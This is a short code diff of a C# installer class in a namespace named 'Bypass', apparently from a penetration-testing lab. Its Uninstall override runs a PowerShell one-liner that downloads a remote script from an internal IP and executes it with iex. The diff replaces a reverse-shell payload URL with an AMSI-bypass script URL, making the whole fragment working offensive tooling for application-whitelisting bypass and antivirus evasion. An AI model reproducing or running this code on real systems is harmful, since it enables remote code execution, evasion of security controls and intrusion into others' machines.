@@ -17,7 +17,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.196:8000/payloads/shells/obfuscate_rev.ps1') | iex";
+            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.250:80/evasion/amsi-bypass/amsi-bp1.ps1') | iex";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
